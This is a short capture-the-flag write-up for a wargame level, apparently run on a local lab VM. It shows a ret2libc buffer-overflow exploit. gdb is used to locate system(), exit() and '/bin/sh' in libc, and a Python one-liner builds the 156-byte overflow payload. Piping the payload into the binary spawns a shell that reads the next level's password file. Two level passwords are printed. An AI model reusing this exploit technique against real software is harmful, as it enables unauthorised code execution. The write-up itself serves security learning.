# Level 04
*password : kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf*

## Analyze

```
scp -P 4242 level04@192.168.56.109:level04 binary/
```
```
(gdb) start
Temporary breakpoint 1 at 0x80486cd
Starting program: /home/users/level04/level04 

Temporary breakpoint 1, 0x080486cd in main ()
(gdb) info funct exit
...
0xf7ee45c4  _exit
...
(gdb) info funct system
...
0xf7e6aed0  system
...
(gdb) info proc map
...
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
...
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

`system()` address : 0xf7e6aed0\
`exit()` address : 0xf7ee45c4\
`/bin/sh` address : 0xf7f897ec\

- offset = 156

```
$ python -c 'print "\x42" * 156 + "\xd0\xae\xe6\xf7" + "\xc4\x45\xee\xf7" + "\xec\x97\xf8\xf7"' > /tmp/level04
$ cat /tmp/level04 - | ./level04
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```
